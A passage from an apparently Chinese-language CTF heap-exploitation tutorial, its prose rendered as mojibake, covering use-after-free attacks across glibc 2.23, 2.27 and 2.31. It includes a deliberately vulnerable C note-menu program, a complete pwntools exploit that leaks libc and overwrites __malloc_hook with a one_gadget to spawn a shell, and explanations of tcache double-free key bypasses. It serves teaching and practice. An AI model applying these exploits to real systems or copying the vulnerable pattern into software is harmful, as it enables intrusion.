class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1.add&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2.edit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3.delete&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4.show&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5.exit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;choice&gt; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">char</span> temp[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, temp, <span class="number">8</span>);</span><br><span class="line">    i = atoi(temp);</span><br><span class="line">    <span class="keyword">if</span> (i &gt; <span class="number">20</span>)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;size?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, temp, <span class="number">8</span>);</span><br><span class="line">    size = atoi(temp);</span><br><span class="line">    <span class="keyword">if</span> (size &gt; <span class="number">0</span> &amp;&amp; size &lt; <span class="number">0x500</span>)</span><br><span class="line">        sizearray[i] = size;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> *p = <span class="built_in">malloc</span>(size);</span><br><span class="line">    heaparray[i] = p;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, p, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> temp[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, temp, <span class="number">8</span>);</span><br><span class="line">    i = atoi(temp);</span><br><span class="line">    <span class="keyword">if</span> (heaparray[i])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, heaparray[i], sizearray[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> temp[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, temp, <span class="number">8</span>);</span><br><span class="line">    i = atoi(temp);</span><br><span class="line">    <span class="keyword">if</span> (heaparray[i])</span><br><span class="line">        <span class="built_in">puts</span>(heaparray[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> temp[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, temp, <span class="number">8</span>);</span><br><span class="line">    i = atoi(temp);</span><br><span class="line">    <span class="keyword">if</span> (heaparray[i])</span><br><span class="line">        <span class="built_in">free</span>(heaparray[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> choice;</span><br><span class="line">    myinit();</span><br><span class="line">    menu();</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (choice == <span class="number">1</span>)</span><br><span class="line">            add();</span><br><span class="line">        <span class="keyword">if</span> (choice == <span class="number">2</span>)</span><br><span class="line">            edit();</span><br><span class="line">        <span class="keyword">if</span> (choice == <span class="number">3</span>)</span><br><span class="line">            <span class="keyword">delete</span> ();</span><br><span class="line">        <span class="keyword">if</span> (choice == <span class="number">4</span>)</span><br><span class="line">            show();</span><br><span class="line">        <span class="keyword">if</span> (choice == <span class="number">5</span>)</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        menu();</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h2><h3 id="åˆ©ç”¨æ‰‹æ³•"><a href="#åˆ©ç”¨æ‰‹æ³•" class="headerlink" title="åˆ©ç”¨æ‰‹æ³•"></a>åˆ©ç”¨æ‰‹æ³•</h3><p>â€‹    2.23çš„UAFæ˜¯æ¯”è¾ƒç»å…¸çš„åˆ©ç”¨æ‰‹æ³•äº†ï¼Œæ­¤æ—¶libcè¿˜æ²¡æœ‰å¼•å…¥tcacheç»“æ„ï¼Œä»…ä»…é€šè¿‡fastbinæ¥ç®¡ç†è¾ƒå°çš„chunkï¼Œåœ¨libc2.23ä¸‹å¯ä»¥åˆ©ç”¨fastbin attackæ¥æ”»å‡»__malloc_hookæ¥getshellã€‚</p><p>â€‹    å…·ä½“æ­¥éª¤ï¼Œæ˜¯å…ˆé€šè¿‡ç”³è¯·ä¸€ä¸ªå±äºunsorted binå¤§å°çš„å †å—ï¼Œåˆ©ç”¨UAF+binaryçš„showåŠŸèƒ½æ¥æ³„éœ²libcçš„åŸºåœ°å€ï¼Œå†é€šè¿‡uafç”³è¯·æ»¡è¶³fastbinå¤§å°çš„chunkï¼Œå¹¶ä¿®æ”¹å…¶fdæŒ‡é’ˆï¼Œå°†__malloc_hookå‘¨å›´æ»¡è¶³æ£€æŸ¥çš„åœ°å€é“¾åˆ°fastbinä¸­ï¼Œå†æ¬¡ç”³è¯·ç›¸åŒå¤§å°çš„chunkå³å¯å°†å…¶å–å‡ºï¼Œä¿®æ”¹ä¸ºone_gadgetå³å¯getshellã€‚</p><p>â€‹    ä¿®æ”¹__malloc_hookçš„åŸå› æ˜¯åœ¨__libc_mallocä¸­ä¼šå…ˆäºåˆ†é…è¿‡ç¨‹æ£€æŸ¥__malloc_hookæ˜¯å¦ä¸ºç©ºï¼Œè‹¥ä¸ä¸ºç©ºåˆ™è°ƒç”¨ã€‚__malloc_hookåœ¨é¦–æ¬¡mallocçš„æ—¶å€™ä¼šç”¨ä½œåˆå§‹åŒ–ç›¸å…³çš„å·¥ä½œæ¥ä½¿ç”¨ï¼Œå¾€åå…¶å€¼ä¸º0ï¼Œå› ä¸ºåœ¨ä»fastbinä¸­å–chunkçš„è¿‡ç¨‹ä¸­ä¼šæ£€æŸ¥sizeæ˜¯å¦åˆæ³•ï¼Œæ‰€ä»¥è¦åœ¨__malloc_hookå‘¨å›´æ‰¾å‡ºä¸€å—åˆæ³•çš„åœ°å€ï¼Œç»éªŒæ¥è¯´ï¼Œåœ¨__malloc_hook - 0x23çš„ä½ç½®å¤„æœ‰ä¸€ä¸ªåˆæ³•çš„sizeä½ï¼Œå¯ä»¥ç”¨æ¥ä¼ªé€ chunkã€‚</p><p><img src="https://i.loli.net/2021/05/18/PyaVxfZnKAY7mNk.png" style="zoom:50%;" /></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>â€‹    æ³„éœ²LIBCåœ°å€</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">2</span>, <span class="number">0x100</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"><span class="comment"># ç”³è¯·0x10é˜²æ­¢åœ¨free 0x100çš„æ—¶å€™è¯¥chunkä¸top chunkåˆå¹¶</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x10</span>, <span class="string">&#x27;protect&#x27;</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x30</span>, <span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="comment"># è¿™é‡Œä¹Ÿå¯ä»¥ä¸ç”¨ç”³è¯·ä¸€ä¸ªchunkï¼Œæ¯•ç«Ÿæœ‰UAFï¼Œå¯ä»¥ç›´æ¥show</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">344</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">__malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br></pre></td></tr></table></figure><p>â€‹    fastbin attack</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç”³è¯·0x60çš„chunkå¯ä»¥æ¥å¯¹åº”åˆ°__malloc_hook-0x23å¤„çš„size</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># ä¿®æ”¹fastbinçš„fdæŒ‡é’ˆ</span></span><br><span class="line">edit(<span class="number">0</span>, p64(__malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">og = libc_base + <span class="number">0xd5bf7</span></span><br><span class="line"><span class="comment"># ç”³è¯·åˆ°__malloc_hook - 0x23ï¼Œè¦†å†™hookçš„å€¼ä¸ºone_gadget</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>,<span class="number">0x13</span> * <span class="string">b&#x27;\x00&#x27;</span> + p64(og))</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/18/ocSeuN2OasW7Tjn.png" style="zoom:50%;" /></p><p>â€‹    å®Œæ•´expå¦‚ä¸‹ä»…ä¾›å‚è€ƒï¼Œç”±äºæ•´ä¸ªç¨‹åºåœ¨å †å—ç¼–è¾‘çš„è¿‡ç¨‹ä¸­é™åˆ¶å¾ˆå®½æ¾ï¼Œå¤§å®¶å¯ä»¥è‡ªå·±å†™å‡ºæ›´å¤šç§exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./UAF_glibc2.23&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc-2.23.so&#x27;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index, size, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;size&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;======================== LEAK LIBC ADDRESS =======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x100</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x10</span>, <span class="string">&#x27;protect&#x27;</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x30</span>, <span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">344</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">__malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;======================== FASTBIN ATTACK =======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(__malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">og = libc_base + <span class="number">0xd5bf7</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>,<span class="number">0x13</span> * <span class="string">b&#x27;\x00&#x27;</span> + p64(og))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;======================== TRIGGER MALLOC HOOK =======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="2-27"><a href="#2-27" class="headerlink" title="2.27"></a>2.27</h2><p>â€‹    libc2.27åœ¨æ›´æ–°åï¼Œmallocæºç å‘ç”Ÿäº†å˜åŒ–ï¼ŒåŸºæœ¬ä¸Šå’Œlibc2.31çš„æºç ä¸€æ ·ï¼Œå¼•å…¥äº†keyæŒ‡é’ˆæ¥é¿å…double freeï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨2.27ä¸‹çš„åˆ©ç”¨æ‰‹æ³•å’Œ2.31ä¸‹çš„åˆ©ç”¨æ‰‹æ³•åŸºæœ¬ä¸€è‡´ï¼Œç›´æ¥ç¯¡æ”¹keyæŒ‡é’ˆå³å¯ç»•è¿‡æ£€æŸ¥ã€‚</p><p>â€‹    åœ¨è€ç‰ˆlibcä¸‹å…³äºtcacheçš„ä¿©ç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p>â€‹    ä»tcacheä¸­æ‹¿å †å—çš„å‡½æ•°tcache_get()</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹    freeåæ”¾å…¥tcacheä¸­çš„å‡½æ•°tcache_put()</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹    tcache binå’Œfastbinçš„ç®¡ç†æ–¹å¼å¾ˆåƒï¼Œéƒ½é‡‡ç”¨FILOçš„å•é“¾è¡¨ï¼ˆç†è§£ä¸ºæ•°æ®ç»“æ„ä¸­çš„æ ˆï¼‰ï¼Œä½†æ˜¯tcacheçš„ä¼˜å…ˆçº§æ›´é«˜ï¼Œå¹¶ä¸”åœ¨binä¸­ï¼Œfastbinçš„fdæŒ‡é’ˆæŒ‡å‘ä¸Šä¸€ä¸ªchunkçš„å¤´éƒ¨ï¼Œè€Œtcacheä¼šæŒ‡å‘ä¸Šä¸€ä¸ªchunkçš„æ•°æ®éƒ¨åˆ†ã€‚</p><p>â€‹    æ—§ç‰ˆlibc2.27ä¸­ï¼Œtcacheç»“æ„ä½“æ²¡æœ‰å¼•å…¥keyæŒ‡é’ˆï¼Œå¯ä»¥éšæ„double freeï¼Œåœ¨UAFä¸‹ï¼Œä½¿å¾—åˆ©ç”¨æ‰‹æ³•æ›´ä¸ºå®¹æ˜“ï¼Œå¹¶ä¸”åœ¨åˆ†é…çš„è¿‡ç¨‹ä¸­æ²¡æœ‰å¯¹sizeè¿›è¡Œæ£€æŸ¥ï¼Œæ‰€ä»¥åœ¨æ—§ç‰ˆlibc2.27ä¸‹å¾ˆå¸¸è§çš„ä¸€ç§åˆ©ç”¨æ‰‹æ³•å°±æ˜¯å¡«æ»¡tcacheåï¼Œç”³è¯·unsorted binå¤§å°çš„chunkåˆ©ç”¨UAFè¿›è¡Œåœ°å€æ³„éœ²ï¼Œåˆ©ç”¨tcacheéšæ„double freeçš„ç‰¹æ€§æ¥ä¿®æ”¹__free_hookæŒ‡é’ˆä¸ºone<em>gadgetï¼ŒåŸç†åŒ\</em>_malloc_hookã€‚</p><p>â€‹    ç°åœ¨æ¯”èµ›ä¸­æ¶‰åŠlibc2.27çš„ä¸€èˆ¬éƒ½ä¼šæ¢ä¸Šæ–°ç‰ˆçš„libcï¼Œæ–°ç‰ˆlibc2.27çš„éƒ¨åˆ†æˆ‘ä»¬åˆ°2.31å¤„å†è¿›è¡Œè®¨è®ºã€‚</p><h2 id="2-31"><a href="#2-31" class="headerlink" title="2.31"></a>2.31</h2><h3 id="åˆ©ç”¨æ‰‹æ³•-1"><a href="#åˆ©ç”¨æ‰‹æ³•-1" class="headerlink" title="åˆ©ç”¨æ‰‹æ³•"></a>åˆ©ç”¨æ‰‹æ³•</h3><p>â€‹    åœ¨libc2.31ä¸­ï¼Œæˆ‘ä»¬æŸ¥çœ‹tcacheçš„ç›¸å…³ç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="comment">// æ–°å¼•å…¥äº†keyæŒ‡é’ˆ</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">// è¿™ä¸ªä½ç½®å¾ˆæœ‰è¶£ï¼Œåœ¨libc2.27ä¸­çš„æ•°æ®ç»“æ„æ˜¯charä¸€ä¸ªå­—èŠ‚ï¼Œlibc2.31è¢«æ›´æ–°ä¸ºuint16_tç±»å‹ä¸º2ä¸ªå­—èŠ‚äº†</span></span><br><span class="line">  <span class="keyword">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p>â€‹    ä»tcacheä¸­æ‹¿å †å—çš„å‡½æ•°tcache_get()</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="comment">// å–å‡ºæ—¶å°†keyå­—æ®µè®¾ç½®ä¸ºNULL</span></span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹    freeåæ”¾å…¥tcacheä¸­çš„å‡½æ•°tcache_put()</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹    keyå­—æ®µç”¨äºæ£€æµ‹æ˜¯å¦å­˜åœ¨double freeï¼Œåœ¨_int_freeä¸­æœ‰è¿™æ ·ä¸€æ®µä»£ç æ¥æ£€æµ‹tcacheä¸­çš„double free</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line"> tmp;</span><br><span class="line"> tmp = tmp-&gt;next)</span><br><span class="line">      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">    <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">       few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>â€‹    è¿™æ®µä»£ç çš„æ„æ€å°±æ˜¯å¦‚æœkeyå€¼ç­‰äºtcacheçš„åœ°å€ï¼Œé‚£ä¹ˆå°±è¿›å…¥tcacheçš„é“¾è¡¨ï¼Œç„¶ååç§»ï¼Œåˆ¤æ–­å½“å‰å †å—æ˜¯å¦åœ¨é“¾è¡¨ä¸­ï¼Œå¦‚æœåœ¨é“¾è¡¨ä¸­ï¼Œé‚£ä¹ˆå¾ˆæ˜¾ç„¶å°±æ˜¯double freeäº†ã€‚ç»•è¿‡æ–¹æ³•å¾ˆç®€å•ï¼Œåˆ©ç”¨æ¼æ´æ”¹æ‰keyå€¼å³å¯ï¼Œç›´æ¥ç»™å¹²æ‰ifåˆ¤æ–­äº†ï¼Œå°±ä¸ä¼šè¿›å…¥è¿™ä¸ªifåˆ†æ”¯äº†ã€‚</p><p>â€‹    åœ¨UAFä¸‹çš„åˆ©ç”¨æ‰‹æ³•ä¸ºé¦–å…ˆå¡«æ»¡tcacheï¼Œç„¶åç”³è¯·unsorted 